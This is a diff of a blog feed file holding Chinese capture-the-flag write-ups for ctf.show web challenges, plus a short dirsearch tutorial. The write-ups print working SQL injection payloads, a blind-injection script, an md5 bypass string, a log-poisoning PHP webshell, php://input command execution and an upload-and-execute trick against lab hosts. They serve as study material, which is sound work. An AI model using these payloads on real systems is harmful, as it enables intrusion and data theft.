+<p> 从robots.txt文件的内容中可以发现, 作者给了提示, index.phps文件应该就是此关卡的源码文件</p>
+<p> 然后就是访问这个地址给你一个下载链接我们直接打开得到</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $flag=&quot;&quot;;</span><br><span class="line">		$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">		if(strlen($password)&gt;10)&#123;</span><br><span class="line">			die(&quot;password error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">					while($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						 echo &quot;登陆成功&lt;br&gt;&quot;;</span><br><span class="line">						 echo $flag;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 从源码中可以发现, SQL中使用了md5()函数加密, 我们可以利用MD5加密漏洞来绕过</p>
+<p>考验你的代码审计，如果php有没怎么学的建议恶补一下，学一下语法和php的数据库连接</p>
+<pre><code>$sql=&quot;select * from user where username =&#39;admin&#39; and password =&#39;&quot;.md5($password,true).&quot;&#39;&quot;;
+        $result=mysqli_query($con,$sql);
+            if(mysqli_num_rows($result)&gt;0)&#123;
+                while($row=mysqli_fetch_assoc($result))&#123;
+                         echo &quot;登陆成功&lt;br&gt;&quot;;
+                         echo $flag;
+</code></pre>
+<p>我们主要看这一块，那些mysqli什么的函数如果没用过直接上菜鸟搜函数的作用，下面的函数大概就是如果能成功访问到数据库获得那些行值就能执行while 那也就是说 r e s u l t 这 个 值 必 须 是 正 确 的 ， 那 我 们 就 来 看 看 result这个值必须是正确的， 那我们就来看看 result这个值必须是正确的，那我们就来看看result</p>
+<pre><code>$result=mysqli_query($con,$sql);
+</code></pre>
+<p>和 s q l 是 有 关 系 的 也 就 是 sql 是有关系的 也就是 sql是有关系的也就是sql的查询语句要是正确的，那我们接下来看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>username这一部分原网页里面就已经帮我填写了 那我们重点来看password这一块<br>首先了解一下md5这个函数后面有个参数默认是false返回32位的16进制数，而这里是true<br>菜鸟教程上给出的解释是TRUE - 原始 16 字符二进制格式 大致就是把你这一堆MD5值又弄成字符串了<br>大家想想前面值为真了,那这边如果是 or xxxxx的话不就是恒真了嘛。那就想想有什么字符输进去最后会转成 带 or 的，然后这里我就开始进行强大的搜索引擎了 最后找到篇博客 里面就是这道题，然后大佬给出了两个值一个是<br>129581926211651571912466741651878684928<br>另一个是<br>ffifdyop<br>那这样下次这样的题目如果判断全是数字就用上面，如果判断是字符就用下面</p>
+<p>这边因为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
+
+<p>有限制长度</p>
+<p>所以在密码框中输入 ffifdyop, 即可登录成功, 获取flag</p>
+<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p>和web9一样。先查看一下源码，<br> 右键查看源代码<br> 进入style.css<br> 发现有index.phps<br> 在url处输入后，查看源码得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">		$flag=&quot;&quot;;</span><br><span class="line">        function replaceSpecialChar($strParam)&#123;</span><br><span class="line">             $regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;</span><br><span class="line">             return preg_replace($regex,&quot;&quot;,$strParam);</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$con)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		if(strlen($username)!=strlen(replaceSpecialChar($username)))&#123;</span><br><span class="line">			die(&quot;sql inject error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		if(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;</span><br><span class="line">			die(&quot;sql inject error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=&quot;select * from user where username = &#x27;$username&#x27;&quot;;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">					while($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						if($password==$row[&#x27;password&#x27;])&#123;</span><br><span class="line">							echo &quot;登陆成功&lt;br&gt;&quot;;</span><br><span class="line">							echo $flag;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现被过滤了这些东西select|from|where|join|sleep|and|\s|union|,<br>又被这个避免了双写绕过if(strlen($password)!&#x3D;strlen(replaceSpecialChar($password))){ die(“sql inject error”);}</p>
+<p>定义了过滤函数，对username和password进行过滤，然后判断输入的password是否对应根据我们输入的username从数据库中查到的密码</p>
+<p>这时候，我们要用到group by和roll with<br>group by（将结果集中的数据行根据选择列的值进行逻辑分组）：<br>在使用group by以后会按照password中的值进行排列：<br>with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）<br>此时我们发现，多出一行NULL，并且count（*）为统计和。<br>加入with rollup后 password有一行为NULL。<br>payload在用户名框中进行输入，密码框不输入，使其为空，满足 p a s s w o r d &#x3D; &#x3D; password&#x3D;&#x3D; password&#x3D;&#x3D;row[‘password’]</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span><br></pre></td></tr></table></figure>
+
+<h1 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h1><p>查看源代码，按注释提示，构造参数试试?cmd&#x3D;aa</p>
+<pre><code>&lt;?php
+#error_reporting(0);
+?&gt;
+&lt;html lang=&quot;zh-CN&quot;&gt;
+ 
+&lt;head&gt;
+    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot; /&gt;
+    &lt;title&gt;ctf.show_红包题&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;center&gt;
+    &lt;h2&gt;ctf.show_红包题&lt;/h2&gt;
+    &lt;h4&gt;where is the flag?&lt;/h4&gt;
+    &lt;/center&gt;
+    &lt;!-- hint:?cmd= --&gt;
+    &lt;?php
+        if(isset($_GET[&#39;cmd&#39;]))&#123;
+            $cmd=$_GET[&#39;cmd&#39;];
+            highlight_file(__FILE__);
+            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;
+            
+                die(&quot;cerror&quot;);
+            &#125;
+            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#39;|\&quot;|\:|\,/&quot;,$cmd))&#123;
+                die(&quot;serror&quot;);
+            &#125;
+            eval($cmd);
+        
+        &#125;
+    
+     ?&gt;
+ 
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>源码中过滤了很多东西，可以使用的字符：p &#96; ? &#x2F; + &lt; &gt; &#x3D;</p>
+<p>通过可用的字符构造cmd&#x3D;?&gt;&lt;?&#x3D;<code>.+/??p/p?p??????</code>，由eval（$cmd）来运行临时文件</p>
+<p>备注：问号?代表一个任意字符，通配符&#x2F;??p&#x2F;p?p??????匹配&#x2F;tmp&#x2F;phpxxxxxx</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后bp抓包，修改几个地方，发现根目录下有flag.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br><span class="line">Host: 4947507e-e5ac-452c-8f01-80f5309742d9.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 237</span><br><span class="line"></span><br><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">#! /bin/sh</span><br><span class="line"></span><br><span class="line">ls /</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br></pre></td></tr></table></figure>
+
+<p>修改命令为cat &#x2F;flag.txt 得到flag</p>
+]]></content>
+      <tags>
+        <tag>ctf解题</tag>
       </tags>
   </entry>
   <entry>
@@ -3758,295 +4132,39 @@ chmod(&quot;/somedir/somefile&quot;, 0755);
       </tags>
   </entry>
   <entry>
-    <title>ctfshow</title>
-    <url>/2023/08/17/ctfshow/</url>
-    <content><![CDATA[<p>ctfshow</p>
-<span id="more"></span>
+    <title>dirsearch</title>
+    <url>/2023/08/15/dirsearch/</url>
+    <content><![CDATA[<h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h1><span id="more"></span>
 
-<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>查看源码，base64解码得flag</p>
-<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>构造SQL注入语句，这是一个登录功能，那应该考虑是字符串注入，在username后面加上<code> &#39; or 1=1  #</code>发送</p>
-<p>成功登录。证明构造的语句没有问题，接下来就是一把梭，猜解字段数、获取数据库名、获取表名、获取字段、拿到flag！</p>
-<p><code>&#39;username=ctfshow&#39; order by 3  #&amp;password=123</code>显示登录成功，</p>
-<p><code>&#39;username=ctfshow&#39; order by 4  #</code>不显示，证明有三个字段。</p>
-<p><code>username=ctfshow&#39; union select 1,2,3  #&amp;password=123</code>确定回显位置，看到2显示在了页面上，利用2这个位置继续搞。</p>
-<p><code>username=ctfshow&#39; union select 1,database(),3  #&amp;password=123</code>获取到数据库名</p>
-<p><code>username=ctfshow&#39; union select 1,group_concat(table_name),3  from information_schema.tables where table_schema=&#39;web2&#39;   #&amp;password=123</code> 获取数据库的表名，找到flag表啦</p>
-<p><code>username=ctfshow&#39; union select 1,group_concat(column_name),3  from information_schema.columns where table_name=&#39;flag&#39;   #&amp;password=123</code>获取flag表中的字段名</p>
-<p><code>username=ctfshow&#39; union select 1,group_concat(flag),3 from flag  #&amp;password=123</code>获取flag！</p>
-<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>php伪协议</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf.show_web3</span><br><span class="line">&lt;?php include($_GET[&#x27;url&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 页面中显示了部分源码,明显是引导我们利用文件包含漏洞进行操作,源码中的include()函数通过GET请求接收一个url参数,那接下来我们就给它传递一个url参数</p>
-<p>使用Burp Suite抓包,利用php:&#x2F;&#x2F;input伪协议执行PHP代码,代码的内容为执行系统命令,查看当前目录下所有文件</p>
-<pre><code>?url=php://input        -- GET请求的url中拼接伪协议
-&lt;?php system(&#39;ls&#39;)?&gt;    -- post请求内容构造需要执行的代码
+<p>dirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。</p>
+<p>相比其他扫描工具disearch的特点是：</p>
+<pre><code>支持HTTP代理
+多线程
+支持多种形式的网页（asp,php）
+生成报告（纯文本，JSON）
+启发式检测无效的网页
+递归扫描
+用户代理随机化
+批量处理
+扫描器与字典（注：字典必须是文本文件）
 </code></pre>
-<p>得到crf_go_go_go index.php，该文件就是存放flag的文件</p>
-<p>我们直接在url地址栏中拼接url参数,访问crf_go_go_go文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=ctf_go_go_go</span><br></pre></td></tr></table></figure>
-
-<p>成功获取flag</p>
-<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>日志注入</p>
-<p> ($_GET[‘url’])可看出存在文件包含漏洞</p>
-<p>F12打开网络栏，可以看到Server里面是nginx，尝试一下日志注入</p>
-<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817104534044.png" alt="image-20230817104534044"></p>
-<p> nginx服务器默认日志位置在</p>
-<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
-<p>在url后面输入查看一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-
-<p> 发现可以</p>
-<p>用Burp Suite抓包，在User-Agent后面写个🐎</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;])?&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 放包，注意看日志下面这时多出来一条</p>
-<p>此时木马已经插入进去了，日志中的代码会被执行但不会显示</p>
-<p>连接蚁剑</p>
-<p>注意URL地址写的是日志地址，因为我们的🐎是传进日志里了</p>
-<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817105306721.png" alt="image-20230817105306721"></p>
-<p>在上层可以看到flag.txt</p>
-<p> <img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817105325864.png" alt="image-20230817105325864"></p>
-<p> 拿到flag</p>
-<p>ctfshow{05eeaf03-2f53-4cc6-959c-f65fb4a7163a}</p>
-<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>考点：php代码审计</p>
-<pre><code> &lt;?php
-        $flag=&quot;&quot;;
-        $v1=$_GET[&#39;v1&#39;];
-        $v2=$_GET[&#39;v2&#39;];
-        if(isset($v1) &amp;&amp; isset($v2))&#123;
-            if(!ctype_alpha($v1))&#123;
-                die(&quot;v1 error&quot;);
-            &#125;
-            if(!is_numeric($v2))&#123;
-                die(&quot;v2 error&quot;);
-            &#125;
-            if(md5($v1)==md5($v2))&#123;
-                echo $flag;
-            &#125;
-        &#125;else&#123;
-        
-            echo &quot;where is flag?&quot;;
-        &#125;
-    ?&gt;  echo &quot;where is flag?&quot;;
-    &#125;
-?&gt;
+<p>下载及安装<br> 要求:python 3.7或更高版本 </p>
+<pre><code>其中，db文件夹为自带字典文件夹；reports为扫描日志文件夹；dirsearch.py为主程序文件 
 </code></pre>
-<ul>
-<li>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</li>
-<li>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</li>
-</ul>
-<p>这里我们可以使用MD5的0e绕过方式,输入一下payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure>
+<h1 id="2-下载地址"><a href="#2-下载地址" class="headerlink" title="2.下载地址"></a>2.下载地址</h1><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
+<p>目前版本是更新到0.42。</p>
+<h1 id="3-下载到本地，安装使用"><a href="#3-下载到本地，安装使用" class="headerlink" title="3.下载到本地，安装使用"></a>3.下载到本地，安装使用</h1><p>pip3 install -r requirements.txt     &#x2F;&#x2F;安装依赖包</p>
+<p>下载超时了，找国内镜像。如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt -i https://pypi.douban.com/simple</span><br></pre></td></tr></table></figure>
 
-<p>QNKCDZO 的md5值为 0e830400451993494058024219903391</p>
-<p>240610708 的md5值为 0e462097431906509019562988736854</p>
-<p>分别满足纯字母和数字字符串,并且md5值以0e开头,而0e开头的字符串参与比较(&#x3D;&#x3D;)时,会转化为0,也就是 0&#x3D;&#x3D;0,返回true使if判断成立,从而输出flag</p>
-<p>常用的值：</p>
-<pre><code>开头为0E（MD5值） 字母数字混合类型：
-s878926199a
-0e545993274517709034328855841020
-s155964671a
-0e342768416822451524974117254469
-s214587387a
-0e848240448830537924465865611904
-s214587387a
-0e848240448830537924465865611904
-纯大写字母：
-QLTHNDT
-0e405967825401955372549139051580
-QNKCDZO
-0e830400451993494058024219903391
-EEIZDOI
-0e782601363539291779881938479162
-纯数字：
-240610708
-0e462097431906509019562988736854
-4011627063
-0e485805687034439905938362701775
-4775635065
-0e998212089946640967599450361168
-4790555361
-0e643442214660994430134492464512
-5432453531
-0e512318699085881630861890526097
-5579679820
-0e877622011730221803461740184915
-5585393579
-0e664357355382305805992765337023
-6376552501
-0e165886706997482187870215578015
-7124129977
-0e500007361044747804682122060876
-7197546197
-0e915188576072469101457315675502
-7656486157
-0e451569119711843337267091732412
-</code></pre>
-<p>任意使用2个即可</p>
-<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>web2的升级版，做了过滤</p>
-<p>一打开页面是用户名密码登录，我们首先第一个想到的就是sql注入了，来用万能钥匙1’ or 1&#x3D;1#试一下，报错了<br>然后，我在密码框里同样注入万能钥匙试了一下，发现，密码框中输入空格也会多一个黑点，于是我猜测可能是把空格过滤了，为了验证 我的猜想，来抓包看一下服务器收到的页面请求包最后传递的用户名和密码的参数值是什么样子的</p>
-<p>抓包果然发现，空格被过滤了</p>
-<p>一般空格被过滤有如下替换方法</p>
-<pre><code>/**/
-()
-回车(url编码中的%0a)
-`(tap键上面的按钮)
-tap
-两个空格
-</code></pre>
-<p>我们就选用&#x2F;**&#x2F;来替换空格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/or/**/1=1#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">阿里云：http://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
 
-<p>好，登陆成功了</p>
-<p>接下来，来老生常谈的爆库爆表爆字段吧<br><strong>爆库</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;/**/union/**/select/**/1,database(),3#&amp;password=1</span><br></pre></td></tr></table></figure>
-
-<p>得到数据库名为web2<br><strong>爆表</strong></p>
-<pre><code>username=1&#39;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;password=1
-</code></pre>
-<p>表有flag和user<br><strong>爆字段</strong></p>
-<pre><code>username=1&#39;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#39;flag&#39;#&amp;password=1
-</code></pre>
-<p>列名也为flag<br><strong>爆字段值</strong></p>
-<pre><code>username=1&#39;/**/union/**/select/**/1,flag,3/**/from/**/flag#&amp;password=1
-</code></pre>
-<p>拿到flag</p>
-<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>与we6相同<br>考点：sql注入 注入点的寻找<br>页面中有一个文章列表,随便点一个</p>
-<p> 从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</p>
-<p>测试发现存在空格过滤，用&#x2F;**&#x2F;绕过</p>
-<p>首先判断注入点,输入以下payload,使SQL恒成立</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1/**/and/**/1</span><br></pre></td></tr></table></figure>
-
-<p>可以看到,页面正常显示</p>
-<p> 在输入以下payload,使SQL恒不成立</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1/**/and/**/0</span><br></pre></td></tr></table></figure>
-
-<p>可以看到,页面空显示</p>
-<p> 由此可以判断页面存在SQL注入,注入点为<strong>数值型注入</strong>,页面中有显示位,可以尝试<strong>联合注入</strong>进行脱库</p>
-<p>1.判断显示位,此处id传一个-1,由于id通常不为负数,后端根据id查询不到内容,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,3</span><br></pre></td></tr></table></figure>
-
-<p>2.判断当前使用的数据库,盲猜flag就藏在当前使用的数据库中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),3</span><br></pre></td></tr></table></figure>
-
-<p>当前使用的数据库是web7</p>
-<p>3.获取当前数据库中的所有表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3</span><br></pre></td></tr></table></figure>
-
-<p>有一个flag表,那flag肯定就藏在这个表里面</p>
-<p>4.获取flag表中的所有字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure>
-
-<p>flag表中只有一个flag字段</p>
-<p>5.查询flag表的flag字段,获取flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3</span><br></pre></td></tr></table></figure>
-
-<p>成功获取flag</p>
-<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>提示是sql注入，第一步先试下 ’ or 1&#x3D;1# 提示sql注入错误</p>
-<p>第二步试下&#x2F;**&#x2F;替代空格，还是错误</p>
-<p>第三步，去掉’单引号，成功，说明过滤了单引号<br> 测试：<code>?id=1/**/or/**/1=1#</code></p>
-<p>回显全部</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>无回显</p>
-<p>考虑盲注</p>
-<p>查看有多少字段<code>1/**/or/**/1=1/**/union/**/select/**/1,2,3#</code>，但是这里又提示sql错误，这里可能过滤了select和union关键字</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤空格：可以使用/**/和%a0绕过</span><br><span class="line">过滤联合查询语句：可以使用盲注替代联合注入</span><br><span class="line">过滤逗号,：可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用 substr(database() from 1 for 1)来代替</span><br><span class="line">过滤and：可以使用or</span><br><span class="line">过滤单引号：表名可以用十六进制来表示</span><br></pre></td></tr></table></figure>
-
-<p>脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=&#x27;http://1a52462e-b3aa-4f50-8445-0792a199259e.chall.ctf.show/index.php&#x27;</span><br><span class="line">table=&quot;&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&#x27; and ascii(substr((select database()),1,1))=xx #</span><br><span class="line">这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</span><br><span class="line"></span><br><span class="line">&#x27; and ascii(substr((select database())from 1 for 1))=xx #</span><br><span class="line">这应该是substring函数的两种用法</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,45):</span><br><span class="line">    print(i)</span><br><span class="line">    for j in range(31,128):</span><br><span class="line">        #爆表名  flag</span><br><span class="line">        #payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br><span class="line">        #爆字段名 flag</span><br><span class="line">        #payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br><span class="line">        #读取flag</span><br><span class="line">        payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + &#x27;?id=0/**/or/**/&#x27; + payload).text</span><br><span class="line"></span><br><span class="line">        if &#x27;I asked nothing&#x27; in ra:</span><br><span class="line">            table += chr(j)</span><br><span class="line">            print(table)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p> 进去以后就是一个登录界面, 盲猜是个SQL注入漏洞,行不通<br> 就觉得该换个思路</p>
-<p>那就扫描下目录吧,dirsearch扫出了一个robots.txt</p>
-<p>我们访问根目录下的 robots.txt 文件</p>
-<pre><code>robots.txt是一个文本文件,同时也是一个协议,规定了爬虫访问的规则( 哪些文件可以爬取,哪些文件不可以爬取)
-</code></pre>
-<p> 从robots.txt文件的内容中可以发现, 作者给了提示, index.phps文件应该就是此关卡的源码文件</p>
-<p> 然后就是访问这个地址给你一个下载链接我们直接打开得到</p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $flag=&quot;&quot;;</span><br><span class="line">		$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">		if(strlen($password)&gt;10)&#123;</span><br><span class="line">			die(&quot;password error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">					while($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						 echo &quot;登陆成功&lt;br&gt;&quot;;</span><br><span class="line">						 echo $flag;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 从源码中可以发现, SQL中使用了md5()函数加密, 我们可以利用MD5加密漏洞来绕过</p>
-<p>考验你的代码审计，如果php有没怎么学的建议恶补一下，学一下语法和php的数据库连接</p>
-<pre><code>$sql=&quot;select * from user where username =&#39;admin&#39; and password =&#39;&quot;.md5($password,true).&quot;&#39;&quot;;
-        $result=mysqli_query($con,$sql);
-            if(mysqli_num_rows($result)&gt;0)&#123;
-                while($row=mysqli_fetch_assoc($result))&#123;
-                         echo &quot;登陆成功&lt;br&gt;&quot;;
-                         echo $flag;
-</code></pre>
-<p>我们主要看这一块，那些mysqli什么的函数如果没用过直接上菜鸟搜函数的作用，下面的函数大概就是如果能成功访问到数据库获得那些行值就能执行while 那也就是说 r e s u l t 这 个 值 必 须 是 正 确 的 ， 那 我 们 就 来 看 看 result这个值必须是正确的， 那我们就来看看 result这个值必须是正确的，那我们就来看看result</p>
-<pre><code>$result=mysqli_query($con,$sql);
-</code></pre>
-<p>和 s q l 是 有 关 系 的 也 就 是 sql 是有关系的 也就是 sql是有关系的也就是sql的查询语句要是正确的，那我们接下来看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>username这一部分原网页里面就已经帮我填写了 那我们重点来看password这一块<br>首先了解一下md5这个函数后面有个参数默认是false返回32位的16进制数，而这里是true<br>菜鸟教程上给出的解释是TRUE - 原始 16 字符二进制格式 大致就是把你这一堆MD5值又弄成字符串了<br>大家想想前面值为真了,那这边如果是 or xxxxx的话不就是恒真了嘛。那就想想有什么字符输进去最后会转成 带 or 的，然后这里我就开始进行强大的搜索引擎了 最后找到篇博客 里面就是这道题，然后大佬给出了两个值一个是<br>129581926211651571912466741651878684928<br>另一个是<br>ffifdyop<br>那这样下次这样的题目如果判断全是数字就用上面，如果判断是字符就用下面</p>
-<p>这边因为</p>
